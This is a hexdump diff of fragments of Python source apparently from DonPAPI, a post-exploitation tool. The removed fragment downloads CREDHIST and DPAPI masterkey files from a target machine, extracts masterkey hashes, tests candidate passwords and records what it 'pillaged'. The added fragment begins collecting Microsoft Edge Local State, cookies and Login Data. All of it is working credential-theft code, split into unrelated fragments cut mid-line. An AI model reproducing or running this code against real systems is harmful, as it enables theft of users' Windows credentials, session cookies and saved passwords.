-00012610: 6e67 2e64 6562 7567 280a 0909 0909 0909  ng.debug(.......
-00012620: 0909 0909 0909 0922 466f 756e 6420 756e  ......."Found un
-00012630: 6578 7065 6374 6564 2066 696c 652f 6469  expected file/di
-00012640: 7265 6374 6f72 7920 2573 2069 6e20 2573  rectory %s in %s
-00012650: 2220 2520 2874 6d70 5f70 7764 332c 206c  " % (tmp_pwd3, l
-00012660: 6f6e 676e 616d 6533 2929 0a09 0909 0909  ongname3))......
-00012670: 0909 0965 6c73 653a 0a09 0909 0909 0909  ...else:........
-00012680: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-00012690: 6562 7567 280a 0909 0909 0909 0909 0909  ebug(...........
-000126a0: 2246 6f75 6e64 2075 6e65 7870 6563 7465  "Found unexpecte
-000126b0: 6420 6669 6c65 2f64 6972 6563 746f 7279  d file/directory
-000126c0: 2025 7320 696e 2025 7322 2025 2028 746d   %s in %s" % (tm
-000126d0: 705f 7077 6432 2c20 6c6f 6e67 6e61 6d65  p_pwd2, longname
-000126e0: 3229 290a 0909 0909 0965 6c69 6620 6973  2))......elif is
-000126f0: 5f64 6972 6563 746f 7279 3a0a 0909 0909  _directory:.....
-00012700: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-00012710: 6562 7567 2822 466f 756e 6420 286e 6f74  ebug("Found (not
-00012720: 2053 4944 2920 4469 7265 6374 6f72 7920   SID) Directory 
-00012730: 2573 2220 2520 6c6f 6e67 6e61 6d65 290a  %s" % longname).
-00012740: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
-00012750: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00012760: 6275 6728 2246 6f75 6e64 2066 696c 6520  bug("Found file 
-00012770: 2573 2220 2520 6c6f 6e67 6e61 6d65 290a  %s" % longname).
-00012780: 0909 0909 0909 6966 2022 4352 4544 4849  ......if "CREDHI
-00012790: 5354 2220 696e 206c 6f6e 676e 616d 653a  ST" in longname:
-000127a0: 0a09 0909 0909 0909 7365 6c66 2e64 6f77  ........self.dow
-000127b0: 6e6c 6f61 645f 6372 6564 6869 7374 2875  nload_credhist(u
-000127c0: 7365 722c 2074 6d70 5f70 7764 2c20 6c6f  ser, tmp_pwd, lo
-000127d0: 6e67 6e61 6d65 2c20 7479 7065 3d27 4d41  ngname, type='MA
-000127e0: 4348 494e 4527 290a 0a09 0965 7863 6570  CHINE')....excep
-000127f0: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-00012800: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
-00012810: 6e67 2e65 7272 6f72 280a 0909 0909 6622  ng.error(.....f"
-00012820: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00012830: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
-00012840: 6f72 732e 4641 494c 7d45 7272 6f72 2069  ors.FAIL}Error i
-00012850: 6e20 4765 744d 6173 7465 726b 6579 2028  n GetMasterkey (
-00012860: 4d61 6368 696e 6529 7b62 636f 6c6f 7273  Machine){bcolors
-00012870: 2e45 4e44 437d 2229 0a09 0909 7365 6c66  .ENDC}")....self
-00012880: 2e6c 6f67 6769 6e67 2e64 6562 7567 2865  .logging.debug(e
-00012890: 7829 0a09 0973 656c 662e 6c6f 6767 696e  x)...self.loggin
-000128a0: 672e 6465 6275 6728 0a09 0909 6622 5b7b  g.debug(....f"[{
-000128b0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-000128c0: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-000128d0: 732e 4f4b 424c 5545 7d5b 2d5d 2047 6174  s.OKBLUE}[-] Gat
-000128e0: 6865 7265 6420 4d61 7374 6572 6b65 7973  hered Masterkeys
-000128f0: 2066 6f72 207b 6c65 6e28 7365 6c66 2e75   for {len(self.u
-00012900: 7365 7273 297d 2075 7365 7273 7b62 636f  sers)} users{bco
-00012910: 6c6f 7273 2e45 4e44 437d 2229 0a0a 0964  lors.ENDC}")...d
-00012920: 6566 2064 6f77 6e6c 6f61 645f 6372 6564  ef download_cred
-00012930: 6869 7374 2873 656c 662c 2075 7365 722c  hist(self, user,
-00012940: 2074 6d70 5f70 7764 2c20 6c6f 6e67 6e61   tmp_pwd, longna
-00012950: 6d65 2c20 7479 7065 3d27 4d41 4348 494e  me, type='MACHIN
-00012960: 4527 293a 0a09 0923 2044 6f77 6e6c 6f61  E'):...# Downloa
-00012970: 6469 6e67 2066 696c 650a 0909 7472 793a  ding file...try:
-00012980: 0a0a 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-00012990: 672e 6465 6275 6728 0a09 0909 0966 225b  g.debug(.....f"[
-000129a0: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-000129b0: 7267 6574 5f69 707d 5d20 5b2e 2e2e 5d20  rget_ip}] [...] 
-000129c0: 446f 776e 6c6f 6164 696e 6720 4352 4544  Downloading CRED
-000129d0: 4849 5354 207b 7573 6572 2e75 7365 726e  HIST {user.usern
-000129e0: 616d 657d 207b 746d 705f 7077 647d 207b  ame} {tmp_pwd} {
-000129f0: 6c6f 6e67 6e61 6d65 7d22 290a 0909 0923  longname}")....#
-00012a00: 2066 726f 6d20 446f 6e50 4150 492e 6c69   from DonPAPI.li
-00012a10: 622e 6470 6170 695f 7069 636b 2e63 7265  b.dpapi_pick.cre
-00012a20: 6468 6973 7420 696d 706f 7274 2043 7265  dhist import Cre
-00012a30: 6448 6973 7446 696c 650a 0909 0923 206c  dHistFile....# l
-00012a40: 6f63 616c 6669 6c65 203d 2073 656c 662e  ocalfile = self.
-00012a50: 6d79 6669 6c65 6f70 732e 6765 745f 6669  myfileops.get_fi
-00012a60: 6c65 286e 7470 6174 682e 6a6f 696e 2874  le(ntpath.join(t
-00012a70: 6d70 5f70 7764 2c20 6c6f 6e67 6e61 6d65  mp_pwd, longname
-00012a80: 2929 0a09 0909 2727 2766 3d6f 7065 6e28  ))....'''f=open(
-00012a90: 6c6f 6361 6c66 696c 652c 2772 6227 290a  localfile,'rb').
-00012aa0: 0909 0963 7265 6468 6973 7464 6174 6120  ...credhistdata 
-00012ab0: 3d20 662e 7265 6164 2829 0a09 0909 662e  = f.read()....f.
-00012ac0: 636c 6f73 6528 290a 0909 096d 7943 7265  close()....myCre
-00012ad0: 6468 6973 7466 696c 6520 3d20 4372 6564  dhistfile = Cred
-00012ae0: 4869 7374 4669 6c65 2872 6177 3d63 7265  HistFile(raw=cre
-00012af0: 6468 6973 7464 6174 6129 0a0a 0909 0970  dhistdata).....p
-00012b00: 7269 6e74 2872 6570 7228 6d79 4372 6564  rint(repr(myCred
-00012b10: 6869 7374 6669 6c65 2929 0a09 0909 236d  histfile))....#m
-00012b20: 7943 7265 6468 6973 7466 696c 6520 3d20  yCredhistfile = 
-00012b30: 4372 6564 4869 7374 4669 6c65 2872 6177  CredHistFile(raw
-00012b40: 3d63 7265 6468 6973 7464 6174 6129 0a09  =credhistdata)..
-00012b50: 0909 666f 7220 7573 6572 6e61 6d65 2069  ..for username i
-00012b60: 6e20 7365 6c66 2e6f 7074 696f 6e73 2e63  n self.options.c
-00012b70: 7265 647a 3a0a 0909 0909 6966 2075 7365  redz:.....if use
-00012b80: 726e 616d 6520 696e 2075 7365 722e 7573  rname in user.us
-00012b90: 6572 6e61 6d65 3a20 2023 2070 6f75 7220  ername:  # pour 
-00012ba0: 666f 6e63 7469 6f6e 6e65 7220 6175 7373  fonctionner auss
-00012bb0: 6920 6176 6563 206c 6520 2e64 6f6d 6169  i avec le .domai
-00012bc0: 6e20 6f75 206c 6573 2073 6573 7369 6f6e  n ou les session
-00012bd0: 7320 6d75 6c74 6970 6c65 2063 6974 7269  s multiple citri
-00012be0: 7820 656e 2075 7365 722e 646f 6d61 696e  x en user.domain
-00012bf0: 2e30 3031 203f 0a09 0909 0909 7365 6c66  .001 ?......self
-00012c00: 2e6c 6f67 6769 6e67 2e64 6562 7567 2866  .logging.debug(f
-00012c10: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
-00012c20: 7461 7267 6574 5f69 707d 5d20 5b2e 2e2e  target_ip}] [...
-00012c30: 5d20 5465 7374 696e 6720 7b6c 656e 2873  ] Testing {len(s
-00012c40: 656c 662e 6f70 7469 6f6e 732e 6372 6564  elf.options.cred
-00012c50: 7a5b 7573 6572 6e61 6d65 5d29 7d20 6372  z[username])} cr
-00012c60: 6564 7a20 666f 7220 7573 6572 207b 7573  edz for user {us
-00012c70: 6572 2e75 7365 726e 616d 657d 2043 5245  er.username} CRE
-00012c80: 4448 4953 5422 290a 0909 0909 0966 6f72  DHIST")......for
-00012c90: 2070 6173 7377 6f72 6420 696e 2073 656c   password in sel
-00012ca0: 662e 6f70 7469 6f6e 732e 6372 6564 7a5b  f.options.credz[
-00012cb0: 7573 6572 6e61 6d65 5d3a 0a09 0909 0909  username]:......
-00012cc0: 0972 6574 3d6d 7943 7265 6468 6973 7466  .ret=myCredhistf
-00012cd0: 696c 652e 6465 6372 7970 7457 6974 6850  ile.decryptWithP
-00012ce0: 6173 7377 6f72 6428 7061 7373 776f 7264  assword(password
-00012cf0: 290a 0909 0909 0909 7072 696e 7428 7265  ).......print(re
-00012d00: 7429 0a09 0909 2727 270a 0909 6578 6365  t)....'''...exce
-00012d10: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
-00012d20: 6578 3a0a 0909 0973 656c 662e 6c6f 6767  ex:....self.logg
-00012d30: 696e 672e 6572 726f 7228 6622 5b7b 7365  ing.error(f"[{se
-00012d40: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-00012d50: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
-00012d60: 4641 494c 7d45 7272 6f72 2069 6e20 4465  FAIL}Error in De
-00012d70: 6372 7970 7469 6e67 2043 7265 6468 6973  crypting Credhis
-00012d80: 747b 6263 6f6c 6f72 732e 454e 4443 7d22  t{bcolors.ENDC}"
-00012d90: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
-00012da0: 672e 6465 6275 6728 6578 290a 0a09 6465  g.debug(ex)...de
-00012db0: 6620 646f 776e 6c6f 6164 5f6d 6173 7465  f download_maste
-00012dc0: 726b 6579 2873 656c 662c 2075 7365 722c  rkey(self, user,
-00012dd0: 2070 6174 682c 2067 7569 642c 2074 7970   path, guid, typ
-00012de0: 6529 3a0a 0909 6775 6964 203d 2067 7569  e):...guid = gui
-00012df0: 642e 6c6f 7765 7228 290a 0909 6966 2069  d.lower()...if i
-00012e00: 735f 6775 6964 2867 7569 6429 3a0a 0909  s_guid(guid):...
-00012e10: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00012e20: 6275 6728 6622 5b7b 7365 6c66 2e6f 7074  bug(f"[{self.opt
-00012e30: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00012e40: 207b 7573 6572 2e75 7365 726e 616d 657d   {user.username}
-00012e50: 202d 2046 6f75 6e64 2047 5549 4420 7b67   - Found GUID {g
-00012e60: 7569 647d 2229 0a09 0923 2044 6f77 6e6c  uid}")...# Downl
-00012e70: 6f61 6469 6e67 2066 696c 650a 0909 6c6f  oading file...lo
-00012e80: 6361 6c66 696c 6520 3d20 7365 6c66 2e6d  calfile = self.m
-00012e90: 7966 696c 656f 7073 2e67 6574 5f66 696c  yfileops.get_fil
-00012ea0: 6528 6e74 7061 7468 2e6a 6f69 6e28 7061  e(ntpath.join(pa
-00012eb0: 7468 2c20 6775 6964 2929 0a09 0923 2047  th, guid))...# G
-00012ec0: 6574 2054 7970 6520 616e 6420 6861 7368  et Type and hash
-00012ed0: 0a09 0974 7279 3a0a 0909 096d 796f 7074  ...try:....myopt
-00012ee0: 696f 6e73 203d 2063 6f70 792e 6465 6570  ions = copy.deep
-00012ef0: 636f 7079 2873 656c 662e 6f70 7469 6f6e  copy(self.option
-00012f00: 7329 0a09 0909 6d79 6f70 7469 6f6e 732e  s)....myoptions.
-00012f10: 7369 6420 3d20 7573 6572 2e73 6964 0a09  sid = user.sid..
-00012f20: 0909 6d79 6f70 7469 6f6e 732e 7573 6572  ..myoptions.user
-00012f30: 6e61 6d65 203d 2075 7365 722e 7573 6572  name = user.user
-00012f40: 6e61 6d65 0a09 0909 6d79 6f70 7469 6f6e  name....myoption
-00012f50: 732e 7076 6b20 3d20 4e6f 6e65 0a09 0909  s.pvk = None....
-00012f60: 6d79 6f70 7469 6f6e 732e 6669 6c65 203d  myoptions.file =
-00012f70: 206c 6f63 616c 6669 6c65 2020 2320 4d61   localfile  # Ma
-00012f80: 7374 6572 6b65 7966 696c 6520 746f 2070  sterkeyfile to p
-00012f90: 6172 7365 0a09 0909 2320 6d79 6f70 7469  arse....# myopti
-00012fa0: 6f6e 732e 6b65 7920 3d20 6b65 792e 6465  ons.key = key.de
-00012fb0: 636f 6465 2822 7574 662d 3822 290a 0909  code("utf-8")...
-00012fc0: 096d 7964 7061 7069 203d 2044 5041 5049  .mydpapi = DPAPI
-00012fd0: 286d 796f 7074 696f 6e73 2c20 7365 6c66  (myoptions, self
-00012fe0: 2e6c 6f67 6769 6e67 290a 0909 0969 6620  .logging)....if 
-00012ff0: 7365 6c66 2e6f 7074 696f 6e73 2e47 6574  self.options.Get
-00013000: 4861 7368 6573 203d 3d20 5472 7565 3a0a  Hashes == True:.
-00013010: 0909 0909 6d61 7374 6572 6b65 795f 6861  ....masterkey_ha
-00013020: 7368 2c20 6973 5f64 6f6d 6169 6e5f 7369  sh, is_domain_si
-00013030: 6420 3d20 6d79 6470 6170 692e 6765 745f  d = mydpapi.get_
-00013040: 6d61 7374 6572 6b65 795f 6861 7368 2867  masterkey_hash(g
-00013050: 656e 6572 6174 655f 6861 7368 3d54 7275  enerate_hash=Tru
-00013060: 6529 0a09 0909 656c 7365 3a0a 0909 0909  e)....else:.....
-00013070: 6d61 7374 6572 6b65 795f 6861 7368 2c20  masterkey_hash, 
-00013080: 6973 5f64 6f6d 6169 6e5f 7369 6420 3d20  is_domain_sid = 
-00013090: 6d79 6470 6170 692e 6765 745f 6d61 7374  mydpapi.get_mast
-000130a0: 6572 6b65 795f 6861 7368 2867 656e 6572  erkey_hash(gener
-000130b0: 6174 655f 6861 7368 3d46 616c 7365 290a  ate_hash=False).
-000130c0: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
-000130d0: 6f6e 2061 7320 6578 3a0a 0909 0973 656c  on as ex:....sel
-000130e0: 662e 6c6f 6767 696e 672e 6572 726f 7228  f.logging.error(
-000130f0: 0a09 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-00013100: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-00013110: 5d20 7b62 636f 6c6f 7273 2e46 4149 4c7d  ] {bcolors.FAIL}
-00013120: 4572 726f 7220 696e 2044 6f77 6e6c 6f61  Error in Downloa
-00013130: 644d 6173 7465 726b 6579 202d 2067 6574  dMasterkey - get
-00013140: 5f6d 6173 7465 726b 6579 5f68 6173 687b  _masterkey_hash{
-00013150: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
-00013160: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-00013170: 6465 6275 6728 6578 290a 0909 7472 793a  debug(ex)...try:
-00013180: 0a09 0909 7573 6572 2e6d 6173 7465 726b  ....user.masterk
-00013190: 6579 735f 6669 6c65 5b67 7569 645d 203d  eys_file[guid] =
-000131a0: 207b 7d0a 0909 0975 7365 722e 6d61 7374   {}....user.mast
-000131b0: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
-000131c0: 5d5b 2770 6174 6827 5d20 3d20 6c6f 6361  ]['path'] = loca
-000131d0: 6c66 696c 650a 0909 0975 7365 722e 6d61  lfile....user.ma
-000131e0: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
-000131f0: 6964 5d5b 2773 7461 7475 7327 5d20 3d20  id]['status'] = 
-00013200: 2765 6e63 7279 7074 6564 270a 0909 0969  'encrypted'....i
-00013210: 6620 7365 6c66 2e6f 7074 696f 6e73 2e47  f self.options.G
-00013220: 6574 4861 7368 6573 203d 3d20 5472 7565  etHashes == True
-00013230: 3a0a 0909 0909 7573 6572 2e6d 6173 7465  :.....user.maste
-00013240: 726b 6579 735f 6669 6c65 5b67 7569 645d  rkeys_file[guid]
-00013250: 5b27 6861 7368 275d 203d 206d 6173 7465  ['hash'] = maste
-00013260: 726b 6579 5f68 6173 680a 0909 0969 6620  rkey_hash....if 
-00013270: 6973 5f64 6f6d 6169 6e5f 7369 6420 616e  is_domain_sid an
-00013280: 6420 7573 6572 2e75 7365 726e 616d 6520  d user.username 
-00013290: 213d 2027 4d41 4348 494e 4524 273a 0a09  != 'MACHINE$':..
-000132a0: 0909 0974 7970 6520 3d20 2744 4f4d 4149  ...type = 'DOMAI
-000132b0: 4e27 0a09 0909 0975 7365 722e 7479 7065  N'.....user.type
-000132c0: 5f76 616c 6964 6174 6564 203d 2054 7275  _validated = Tru
-000132d0: 650a 0909 0909 7573 6572 2e74 7970 6520  e.....user.type 
-000132e0: 3d20 7479 7065 2020 2320 4c4f 4341 4c2c  = type  # LOCAL,
-000132f0: 444f 4d41 494e 2c4d 4143 4849 4e45 2c4d  DOMAIN,MACHINE,M
-00013300: 4143 4849 4e45 2d55 5345 520a 0909 0973  ACHINE-USER....s
-00013310: 656c 662e 6462 2e61 6464 5f73 6964 2875  elf.db.add_sid(u
-00013320: 7365 726e 616d 653d 7573 6572 2e75 7365  sername=user.use
-00013330: 726e 616d 652c 2073 6964 3d75 7365 722e  rname, sid=user.
-00013340: 7369 6429 0a09 0909 7365 6c66 2e64 622e  sid)....self.db.
-00013350: 6164 645f 6d61 7374 6572 6b65 7928 6669  add_masterkey(fi
-00013360: 6c65 5f70 6174 683d 7573 6572 2e6d 6173  le_path=user.mas
-00013370: 7465 726b 6579 735f 6669 6c65 5b67 7569  terkeys_file[gui
-00013380: 645d 5b27 7061 7468 275d 2c20 6775 6964  d]['path'], guid
-00013390: 3d67 7569 642c 0a09 0909 0909 0909 0920  =guid,......... 
-000133a0: 2073 7461 7475 733d 7573 6572 2e6d 6173   status=user.mas
-000133b0: 7465 726b 6579 735f 6669 6c65 5b67 7569  terkeys_file[gui
-000133c0: 645d 5b27 7374 6174 7573 275d 2c0a 0909  d]['status'],...
-000133d0: 0909 0909 0909 2020 7069 6c6c 6167 6564  ......  pillaged
-000133e0: 5f66 726f 6d5f 636f 6d70 7574 6572 5f69  _from_computer_i
-000133f0: 703d 7365 6c66 2e6f 7074 696f 6e73 2e74  p=self.options.t
-00013400: 6172 6765 745f 6970 2c0a 0909 0909 0909  arget_ip,.......
-00013410: 0909 2020 7069 6c6c 6167 6564 5f66 726f  ..  pillaged_fro
-00013420: 6d5f 7573 6572 6e61 6d65 3d75 7365 722e  m_username=user.
-00013430: 7573 6572 6e61 6d65 290a 0909 0969 6620  username)....if 
-00013440: 7365 6c66 2e6f 7074 696f 6e73 2e47 6574  self.options.Get
-00013450: 4861 7368 6573 203d 3d20 5472 7565 3a0a  Hashes == True:.
-00013460: 0909 0909 666f 7220 6861 7368 2069 6e20  ....for hash in 
-00013470: 7573 6572 2e6d 6173 7465 726b 6579 735f  user.masterkeys_
-00013480: 6669 6c65 5b67 7569 645d 5b27 6861 7368  file[guid]['hash
-00013490: 275d 3a0a 0909 0909 0973 656c 662e 6462  ']:......self.db
-000134a0: 2e61 6464 5f64 7061 7069 5f68 6173 6828  .add_dpapi_hash(
-000134b0: 6669 6c65 5f70 6174 683d 7573 6572 2e6d  file_path=user.m
-000134c0: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
-000134d0: 7569 645d 5b27 7061 7468 275d 2c20 7369  uid]['path'], si
-000134e0: 643d 7573 6572 2e73 6964 2c20 6775 6964  d=user.sid, guid
-000134f0: 3d67 7569 642c 0a09 0909 0909 0909 0909  =guid,..........
-00013500: 0920 2020 6861 7368 3d68 6173 682c 2063  .   hash=hash, c
-00013510: 6f6e 7465 7874 3d74 7970 652c 2070 696c  ontext=type, pil
-00013520: 6c61 6765 645f 6672 6f6d 5f63 6f6d 7075  laged_from_compu
-00013530: 7465 725f 6970 3d73 656c 662e 6f70 7469  ter_ip=self.opti
-00013540: 6f6e 732e 7461 7267 6574 5f69 7029 0a09  ons.target_ip)..
-00013550: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
-00013560: 6e20 6173 2065 783a 0a09 0909 7365 6c66  n as ex:....self
-00013570: 2e6c 6f67 6769 6e67 2e65 7272 6f72 280a  .logging.error(.
-00013580: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-00013590: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-000135a0: 207b 6263 6f6c 6f72 732e 4641 494c 7d45   {bcolors.FAIL}E
-000135b0: 7272 6f72 2069 6e20 4461 7461 6261 7365  rror in Database
-000135c0: 2065 6e74 7279 202d 2064 6f77 6e6c 6f61   entry - downloa
-000135d0: 645f 6d61 7374 6572 6b65 795f 6861 7368  d_masterkey_hash
-000135e0: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
-000135f0: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-00013600: 2e64 6562 7567 2865 7829 0a0a 0964 6566  .debug(ex)...def
-00013610: 2067 6574 5f6d 6173 7465 726b 6579 2873   get_masterkey(s
-00013620: 656c 662c 2075 7365 722c 2067 7569 642c  elf, user, guid,
-00013630: 2074 7970 6529 3a0a 0909 6775 6964 203d   type):...guid =
-00013640: 2067 7569 642e 6c6f 7765 7228 290a 0909   guid.lower()...
-00013650: 6966 2067 7569 6420 6e6f 7420 696e 2075  if guid not in u
-00013660: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
-00013670: 696c 653a 0a09 0909 7365 6c66 2e6c 6f67  ile:....self.log
-00013680: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
-00013690: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
-000136a0: 2e74 6172 6765 745f 6970 7d5d 205b 215d  .target_ip}] [!]
-000136b0: 207b 6263 6f6c 6f72 732e 4641 494c 7d7b   {bcolors.FAIL}{
-000136c0: 7573 6572 2e75 7365 726e 616d 657d 7b62  user.username}{b
-000136d0: 636f 6c6f 7273 2e45 4e44 437d 206d 6173  colors.ENDC} mas
-000136e0: 7465 726b 6579 207b 6775 6964 7d20 6e6f  terkey {guid} no
-000136f0: 7420 666f 756e 6422 290a 0909 0972 6574  t found")....ret
-00013700: 7572 6e20 2d31 0a09 0965 6c73 653a 0a09  urn -1...else:..
-00013710: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-00013720: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
-00013730: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-00013740: 745f 6970 7d5d 205b 2d5d 207b 6263 6f6c  t_ip}] [-] {bcol
-00013750: 6f72 732e 4f4b 424c 5545 7d7b 7573 6572  ors.OKBLUE}{user
-00013760: 2e75 7365 726e 616d 657d 7b62 636f 6c6f  .username}{bcolo
-00013770: 7273 2e45 4e44 437d 206d 6173 7465 726b  rs.ENDC} masterk
-00013780: 6579 207b 6775 6964 7d20 466f 756e 6422  ey {guid} Found"
-00013790: 290a 0909 6966 2075 7365 722e 6d61 7374  )...if user.mast
-000137a0: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
-000137b0: 5d5b 2773 7461 7475 7327 5d20 3d3d 2027  ]['status'] == '
-000137c0: 6465 6372 7970 7465 6427 3a0a 0909 0973  decrypted':....s
-000137d0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-000137e0: 6728 0a09 0909 0966 225b 7b73 656c 662e  g(.....f"[{self.
+000041e0: 0a0a 0964 6566 2047 6574 4564 6765 5365  ...def GetEdgeSe
+000041f0: 6372 6574 7328 7365 6c66 293a 0a09 0973  crets(self):...s
+00004200: 656c 662e 6c6f 6767 696e 672e 696e 666f  elf.logging.info
+00004210: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
+00004220: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+00004230: 636f 6c6f 7273 2e4f 4b42 4c55 457d 5b2b  colors.OKBLUE}[+
+00004240: 5d20 4761 7468 6572 696e 6720 4d53 4564  ] Gathering MSEd
+00004250: 6765 2053 6563 7265 7473 207b 6263 6f6c  ge Secrets {bcol
+00004260: 6f72 732e 454e 4443 7d22 290a 0909 626c  ors.ENDC}")...bl
+00004270: 6163 6b6c 6973 7420 3d20 5b27 2e27 2c20  acklist = ['.', 
+00004280: 272e 2e27 5d0a 0a09 0975 7365 725f 6469  '..']....user_di
+00004290: 7265 6374 6f72 6965 7320 3d20 5b28 2255  rectories = [("U
+000042a0: 7365 7273 5c5c 7b75 7365 726e 616d 657d  sers\\{username}
+000042b0: 5c5c 4170 7044 6174 615c 5c4c 6f63 616c  \\AppData\\Local
+000042c0: 5c5c 4d69 6372 6f73 6f66 745c 5c45 6467  \\Microsoft\\Edg
+000042d0: 655c 5c55 7365 7220 4461 7461 222c 2027  e\\User Data", '
+000042e0: 4c6f 6361 6c20 5374 6174 6527 2c0a 0909  Local State',...
+000042f0: 0909 0909 0920 2743 6872 6f6d 654c 6f63  ..... 'ChromeLoc
+00004300: 616c 5374 6174 6527 2c20 2744 4f4d 4149  alState', 'DOMAI
+00004310: 4e27 292c 0a09 0909 0909 0909 2822 5573  N'),........("Us
+00004320: 6572 735c 5c7b 7573 6572 6e61 6d65 7d5c  ers\\{username}\
+00004330: 5c41 7070 4461 7461 5c5c 4c6f 6361 6c5c  \AppData\\Local\
+00004340: 5c4d 6963 726f 736f 6674 5c5c 4564 6765  \Microsoft\\Edge
+00004350: 5c5c 5573 6572 2044 6174 615c 5c44 6566  \\User Data\\Def
+00004360: 6175 6c74 222c 2027 436f 6f6b 6965 7327  ault", 'Cookies'
+00004370: 2c0a 0909 0909 0909 0920 2743 6872 6f6d  ,........ 'Chrom
+00004380: 6543 6f6f 6b69 6573 272c 2027 444f 4d41  eCookies', 'DOMA
+00004390: 494e 2729 2c0a 0909 0909 0909 0928 2255  IN'),........("U
+000043a0: 7365 7273 5c5c 7b75 7365 726e 616d 657d  sers\\{username}
+000043b0: 5c5c 4170 7044 6174 615c 5c4c 6f63 616c  \\AppData\\Local
+000043c0: 5c5c 4d69 6372 6f73 6f66 745c 5c45 6467  \\Microsoft\\Edg
+000043d0: 655c 5c55 7365 7220 4461 7461 5c5c 4465  e\\User Data\\De
+000043e0: 6661 756c 7422 2c0a 0909 0909 0909 0920  fault",........ 
+000043f0: 2745 7874 656e 7369 6f6e 2043 6f6f 6b69  'Extension Cooki
+00004400: 6573 272c 2027 4368 726f 6d65 436f 6f6b  es', 'ChromeCook
+00004410: 6965 7327 2c20 2744 4f4d 4149 4e27 292c  ies', 'DOMAIN'),
+00004420: 0a09 0909 0909 0909 280a 0909 0909 0909  ........(.......
+00004430: 0922 5573 6572 735c 5c7b 7573 6572 6e61  ."Users\\{userna
+00004440: 6d65 7d5c 5c41 7070 4461 7461 5c5c 4c6f  me}\\AppData\\Lo
+00004450: 6361 6c5c 5c4d 6963 726f 736f 6674 5c5c  cal\\Microsoft\\
+00004460: 4564 6765 5c5c 5573 6572 2044 6174 615c  Edge\\User Data\
+00004470: 5c44 6566 6175 6c74 5c5c 4e65 7477 6f72  \Default\\Networ
+00004480: 6b22 2c20 2743 6f6f 6b69 6573 272c 0a09  k", 'Cookies',..
+00004490: 0909 0909 0909 2743 6872 6f6d 6543 6f6f  ......'ChromeCoo
+000044a0: 6b69 6573 272c 2027 444f 4d41 494e 2729  kies', 'DOMAIN')
+000044b0: 2c0a 0909 0909 0909 0928 0a09 0909 0909  ,........(......
+000044c0: 0909 2255 7365 7273 5c5c 7b75 7365 726e  .."Users\\{usern
+000044d0: 616d 657d 5c5c 4170 7044 6174 615c 5c4c  ame}\\AppData\\L
+000044e0: 6f63 616c 5c5c 4d69 6372 6f73 6f66 745c  ocal\\Microsoft\
+000044f0: 5c45 6467 655c 5c55 7365 7220 4461 7461  \Edge\\User Data
+00004500: 5c5c 4465 6661 756c 745c 5c53 6166 6520  \\Default\\Safe 
+00004510: 4272 6f77 7369 6e67 204e 6574 776f 726b  Browsing Network
+00004520: 222c 0a09 0909 0909 0909 2753 6166 6520  ",........'Safe 
+00004530: 4272 6f77 7369 6e67 2043 6f6f 6b69 6573  Browsing Cookies
+00004540: 272c 2027 4368 726f 6d65 436f 6f6b 6965  ', 'ChromeCookie
+00004550: 7327 2c20 2744 4f4d 4149 4e27 292c 0a09  s', 'DOMAIN'),..
+00004560: 0909 0909 0909 2822 5573 6572 735c 5c7b  ......("Users\\{
+00004570: 7573 6572 6e61 6d65 7d5c 5c41 7070 4461  username}\\AppDa
+00004580: 7461 5c5c 4c6f 6361 6c5c 5c4d 6963 726f  ta\\Local\\Micro
+00004590: 736f 6674 5c5c 4564 6765 5c5c 5573 6572  soft\\Edge\\User
+000045a0: 2044 6174 615c 5c44 6566 6175 6c74 222c   Data\\Default",
+000045b0: 2027 4c6f 6769 6e20 4461 7461 272c 0a09   'Login Data',..
+000045c0: 0909 0909 0909 2027 4368 726f 6d65 4c6f  ...... 'ChromeLo
